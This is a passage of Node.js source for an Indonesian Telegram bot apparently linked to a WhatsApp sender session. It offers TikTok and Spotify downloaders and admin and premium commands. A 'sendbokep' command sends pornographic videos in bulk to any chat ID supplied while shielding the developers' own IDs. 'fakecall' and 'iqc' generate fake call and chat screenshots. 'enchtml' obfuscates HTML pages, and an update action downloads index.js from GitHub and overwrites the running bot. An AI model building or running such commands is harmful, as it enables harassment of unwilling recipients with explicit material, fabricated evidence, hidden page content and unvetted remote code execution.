        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    } else {
        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    }
});

bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("enchtml", async (ctx) => {
  if (!ctx.message.reply_to_message?.document) {
    return ctx.reply("❌ Please reply to a .html file you want to encrypt");
  }

  try {
    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${tokenBot}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>MoroseWave</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "enchtmlbymorosewave.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await ctx.replyWithDocument({ source: outputPath }, {
      caption: "✅ Enc Html By MoroseWave ( 🌊 )",
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat membuat file terenkripsi.");
  }
});

const iqcSessions = {}
bot.command("iqc", async (ctx) => {
  const chatId = ctx.chat.id

  try {
    const args = ctx.message.text.split(" ").slice(1)

    if (args.length < 3) {
      return ctx.reply(
        "❌ Format : `/iqc 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      )
    }

    const time = args[0]
    const battery = args[1]
    const message = args.slice(2).join(" ")

    iqcSessions[chatId] = { time, battery, message }

    await ctx.reply("Pilih Provider", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    })
  } catch (err) {
    console.error("ERROR /iqc:", err)
    ctx.reply("Terjadi kesalahan.")
  }
})

bot.action(/^iqc_provider_/, async (ctx) => {
  const chatId = ctx.chat.id

  try {
    const provider = ctx.callbackQuery.data.replace("iqc_provider_", "")
    const data = iqcSessions[chatId]

    if (!data) {
      return ctx.answerCbQuery("Session habis, kirim ulang /iqc", {
        show_alert: true
      })
    }

    const { time, battery, message } = data

    await ctx.answerCbQuery("Diproses...")
    await ctx.reply("Sedang membuat gambar...")

    const apiUrl =
      "https://sockcode.zone.id/api/iqc" +
      `?t=${encodeURIComponent(time)}` +
      `&b=${encodeURIComponent(battery)}` +
      `&m=${encodeURIComponent(message)}` +
      `&p=${encodeURIComponent(provider)}`

    await ctx.replyWithPhoto(apiUrl, {
      caption: "✅ iqc By MoroseWave ( 🕷️ )",
      parse_mode: "Markdown"
    })

    delete iqcSessions[chatId]
  } catch (err) {
    console.error("ERROR callback:", err)
    ctx.reply("Gagal generate gambar.")
  }
})

bot.command("play", async (ctx) => {
   const text = ctx.message.text.split(" ").slice(1).join(" ")

   if (!text) {
      return ctx.reply("[$] Example: /play Payung Teduh")
   }

   try {
      await ctx.reply("⏳ Sedang mencari lagu di Spotify...")

      const { data } = await axios.get(`https://api.nexray.web.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`)

      if (!data.status) {
         return ctx.reply("❌ Lagu tidak ditemukan!")
      }

      const res = data.result

      let caption = `❏ *SPOTIFY - PLAY* ❏

🏷 *Title:* ${res.title}
👤 *Artist:* ${res.artist}
🎧 *Album:* ${res.album}
⏳ *Duration:* ${res.duration}
🎬 *Popularity:* ${res.popularity}
🎉 *Release:* ${res.release_at}
📎 *URL:* ${res.url}`

      await ctx.replyWithPhoto(
         { url: res.thumbnail },
         { caption: caption, parse_mode: "Markdown" }
      )

      await ctx.replyWithAudio(
         { url: res.download_url },
         {
            title: res.title,
            performer: res.artist
         }
      )

   } catch (err) {
      console.log(err)
      ctx.reply("❌ Terjadi kesalahan saat mengambil data.")
   }
});

bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });

bot.command("fixcode", async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`📂 Kirim file .js dan reply dengan perintah /fixcode`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js bre!");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    console.error("FixCode Error:", err);
    ctx.reply("⚠️ Terjadi kesalahan waktu memperbaiki kode.");
  }
});

const tiktokCache = new Map();

bot.command("tiktoksearch", async (ctx) => {
    const userId = ctx.from.id;

    try {
        const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

        if (!text) {
            return ctx.reply(
                "🪧 Masukkan kata kunci!\nContoh: `/tiktoksearch epep`",
                { parse_mode: "Markdown", reply_to_message_id: ctx.message.message_id }
            );
        }

        const loadingMsg = await ctx.reply("⏳ SEARCHING VIDEO TIKTOK...");

        const searchUrl =
            `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(text)}&count=5`;

        const res = await axios.get(searchUrl, { timeout: 20000 });
        const data = res.data;

        const videos =
            data?.data?.videos ||
            data?.data?.list ||
            data?.data?.aweme_list ||
            data?.data ||
            [];

        if (!Array.isArray(videos) || videos.length === 0) {
            await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});
            return ctx.reply("⚠️ Tidak ada hasil ditemukan.");
        }

        const topVideos = videos.slice(0, 5);
        const uniqueKey = Math.random().toString(36).slice(2, 10);

        tiktokCache.set(uniqueKey, {
            data: topVideos,
            expire: Date.now() + (10 * 60 * 1000)
        });

        await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});

        const { Markup } = require('telegraf');
        const buttons = topVideos.map((v, i) =>
            [Markup.button.callback(
                `${i + 1}. ${(v.title || "Tanpa Judul").slice(0, 30)}`,
                `tt_${uniqueKey}_${i}_${userId}`
            )]
        );

        await ctx.reply(
            `📌 Ditemukan ${topVideos.length} hasil untuk:\n${text}\n\nPilih video:`,
            Markup.inlineKeyboard(buttons)
        );

    } catch (err) {
        console.error("❌ TikTok Search Error:", err.message);
        ctx.reply("⚠️ Gagal mengambil hasil pencarian TikTok.");
    }
});

bot.action(/tt_(.+)/, async (ctx) => {
    try {
        const data = ctx.match[1];
        const [cacheKey, index, userId] = data.split("_");

        if (ctx.from.id != userId) {
            return ctx.answerCbQuery("⚠️ Ini bukan tombol kamu!", { show_alert: true });
        }

        const cachedObj = tiktokCache.get(cacheKey);
        if (!cachedObj) {
            return ctx.answerCbQuery("⚠️ Cache expired!", { show_alert: true });
        }

        const v = cachedObj.data[index];
        if (!v) {
            return ctx.answerCbQuery("⚠️ Data tidak valid!", { show_alert: true });
        }

        await ctx.answerCbQuery();

        await ctx.deleteMessage().catch(() => {});
        await ctx.reply("⏳ MENGUNDUH VIDEO...");

        const author =
            v.author?.unique_id ||
            v.author?.nickname ||
            v.user?.unique_id ||
            "unknown";

        const videoId =
            v.video_id ||
            v.id ||
            v.aweme_id ||
            v.short_id ||
            v.video?.id;

        if (!videoId) {
            return ctx.reply("⚠️ ID video tidak valid.");
        }

        const tiktokUrl = `https://www.tiktok.com/@${author}/video/${videoId}`;

        const res = await axios.post(
            "https://www.tikwm.com/api/",
            `url=${encodeURIComponent(tiktokUrl)}`,
            {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                timeout: 30000
            }
        );

        const result = res.data;

        if (!result || result.code !== 0 || !result.data) {
            throw new Error("Video tidak valid");
        }

        const vid = result.data;

        const videoUrl =
            vid.play ||
            vid.hdplay ||
            vid.wmplay ||
            vid.play_addr;

        if (!videoUrl) {
            return ctx.reply("⚠️ Link video tidak ditemukan.");
        }

        const caption =
`☀ MoroseWave Searching  
Video : *${(vid.title || "Video TikTok").slice(0, 80)}*  
Author : @${vid.author?.unique_id || "unknown"}  
Likes : ${vid.digg_count || 0}  
Comment : ${vid.comment_count || 0}  
[🌐 Lihat di TikTok](${tiktokUrl})`;

        try {
            await ctx.replyWithVideo(videoUrl, {
                caption,
                parse_mode: "Markdown"
            });
        } catch {
            const video = await axios.get(videoUrl, {
                responseType: "arraybuffer",
                timeout: 30000
            });

            await ctx.replyWithVideo(
                { source: Buffer.from(video.data) },
                {
                    caption,
                    parse_mode: "Markdown"
                }
            );
        }

        tiktokCache.delete(cacheKey);

    } catch (err) {
        console.error("❌ Callback Error:", err.message);
    }
});

bot.command("cekidgroup", async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    // Cek koneksi WhatsApp
    if (sessions.size === 0) {
      return ctx.reply("❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    // Ambil semua grup yang diikuti oleh bot
    const groups = await sock.groupFetchAllParticipating();
    const groupEntries = Object.values(groups);

    if (groupEntries.length === 0) {
      return ctx.reply("❌ Bot belum join grup mana pun");
    }

    // Buat daftar grup dengan format HTML
    let text = `<b>📋 DAFTAR ID GRUP WHATSAPP</b>\n\n`;
    let no = 1;
    for (const group of groupEntries) {
      text +=
        `<b>${no}.</b> ${group.subject}\n` +
        `ID: <code>${group.id}</code>\n\n`;
      no++;
    }

    // Kirim pesan dengan HTML
    await ctx.reply(text, { parse_mode: "HTML" });
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal mengambil data grup");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });

  try {
    await ctx.reply(" Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("cekkhodam", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");

    if (!text) {
        return ctx.reply("Nama nya mana yang mau di cek khodam nya");
    }

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const hasil = `
╭━━━━°「 *Khodam ${text}* 」°
┃
┊• Nama : ${text}
┊• Khodam : ${pickRandom([
            'Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa',
            'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana',
            'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet',
            'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani',
            'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa',
            'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Gyzen Palembang',
            'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang',
            'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung',
            'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar',
            'Burung Hantu', 'Ikan Cupang'
        ])}
┊• Mendampingi dari : ${pickRandom([
            '1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'dari lahir'
        ])}
┃• Expired : ${pickRandom([
            '2024', '2025', '2026', '2027', '2028', '2029', '2030', '2031', '2032', '2033', '2034', '2035'
        ])}
╰═┅═━––––––๑`;

    ctx.reply(hasil);
});

bot.command("cekkontol", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");

    if (!text) {
        return ctx.reply("Nama nya mana yang mau di cek kontol nya");
    }

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const hasil = `
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┊• Kontol : ${pickRandom(['ih item', 'Belang wkwk', 'Muluss', 'Putih Mulus', 'Black Doff', 'Pink wow', 'Item Glossy'])}
┊• True : ${pickRandom(['perjaka', 'ga perjaka', 'udah pernah dimasukin', 'masih ori', 'jumbo'])}
┊• jembut : ${pickRandom(['lebat', 'ada sedikit', 'gada jembut', 'tipis', 'muluss'])}
┊• ukuran : ${pickRandom(['1cm', '2cm', '3cm', '4cm', '5cm', '20cm', '45cm', '50cm', '90meter', '150meter', '5km', 'gak normal'])}
╰═┅═━––––––๑`;

    ctx.reply(hasil);
});

bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /tourl ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("🕑 Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

// ======================
// AUTO UPDATE SYSTEM
// ======================
const UPDATE_URL = "https://raw.githubusercontent.com/kentungnd9/lucta/refs/heads/main/index.js";
const UPDATE_FILE_PATH = "./index.js"; 

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

// ======================
// ACTION UPDATE (LANGSUNG DARI TOMBOL)
// ======================
bot.action('update_now', async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Akses hanya untuk pemilik");
  }

  await ctx.editMessageCaption(`
<pre><code class="language-javascript">
⏳ Auto Update Script...
Mohon tunggu.
</code></pre>`, { parse_mode: "HTML" });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.editMessageCaption(`
<pre><code class="language-javascript">
✅ Update berhasil!
♻ Restarting bot...
</code></pre>`, { parse_mode: "HTML" });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.editMessageCaption(`
<pre><code class="language-javascript">
❌ Gagal update.
Reason: ${String(e.message || e)}
</code></pre>`, { parse_mode: "HTML" });
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

const PREM_GROUP_FILE = "./grup.json";

function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

const PROTECTED_IDS = new Set([
  "1550001633",
  "8035037851",
]);

const videoList = [
  "https://files.catbox.moe/kusho1.jpg",
  "https://files.catbox.moe/85mjwm.mp4",
  "https://files.catbox.moe/fzzhjm.jpg",
  "https://files.catbox.moe/ec28m8.mp4",
  "https://files.catbox.moe/n3ebuz.mp4",
  "https://files.catbox.moe/qhr4fl.jpg",
  "https://files.catbox.moe/zqaszb.mp4",
  "https://files.catbox.moe/34aa39.mp4",
  "https://files.catbox.moe/dmbizk.mp4",
  "https://files.catbox.moe/wmda7z.mp4",
  "https://files.catbox.moe/kwb2m2.jpg",
  "https://files.catbox.moe/8xye1k.jpg",
  "https://files.catbox.moe/y1osro.mp4",
  "https://files.catbox.moe/2mowo7.jpg",
  "https://files.catbox.moe/o1ipxw.mp4",
  "https://files.catbox.moe/i6335n.mp4",
  "https://files.catbox.moe/73rjgf.jpg",
  "https://files.catbox.moe/3re1pn.jpg",
  "https://files.catbox.moe/sclrvo.jpg",
  "https://files.catbox.moe/l3sra9.jpg",
  "https://files.catbox.moe/vxe9zl.mp4",
  "https://files.catbox.moe/9vtw1i.jpg",
  "https://files.catbox.moe/o1sq2k.mp4",
  "https://files.catbox.moe/y91pkz.jpg",
  "https://files.catbox.moe/0hies4.jpg",
  "https://files.catbox.moe/hnbks1.jpg",
  "https://files.catbox.moe/1a78ht.mp4",
  "https://files.catbox.moe/htcdyl.jpg",
  "https://files.catbox.moe/iajl3r.mp4",
  "https://files.catbox.moe/pamcr7.jpg",
  "https://files.catbox.moe/eti8qi.mp4",
  "https://files.catbox.moe/wgj8vl.mp4",
  "https://files.catbox.moe/83fd5h.mp4",
  "https://files.catbox.moe/k1w8sw.jpg",
  "https://files.catbox.moe/tdqof8.jpg",
  "https://files.catbox.moe/6di4hn.mp4",
  "https://files.catbox.moe/0eisok.mp4",
  "https://files.catbox.moe/e5zkcl.jpg",
];

bot.command("sendbokep", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  const targetId = args[0];
  const jumlah = parseInt(args[1]) || 1;

  if (!targetId) {
    return ctx.reply("❌ Format: /sendbokep <chat_id> [jumlah]");
  }

  if (PROTECTED_IDS.has(String(targetId))) {
    return ctx.replyWithHTML(
  `⛔ Pengiriman diblokir: ID <code>${targetId}</code> termasuk dalam daftar terlindungi (developer).`
  );
  }
  
  await ctx.replyWithHTML(
  `Mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );

  for (let i = 0; i < jumlah; i++) {
    const randomVideo =
      videoList[Math.floor(Math.random() * videoList.length)];

    try {
      await ctx.telegram.sendVideo(targetId, randomVideo);
    } catch (err) {
      console.error("Gagal kirim video:", err.message);

      return ctx.replyWithHTML(
  `❌ Gagal mengirim video ke ID <code>${targetId}</code>: ${err.message}`
  );
    }
  }

  await ctx.replyWithHTML(
    `✅ Berhasil mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );
});

const activePolls = {};

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
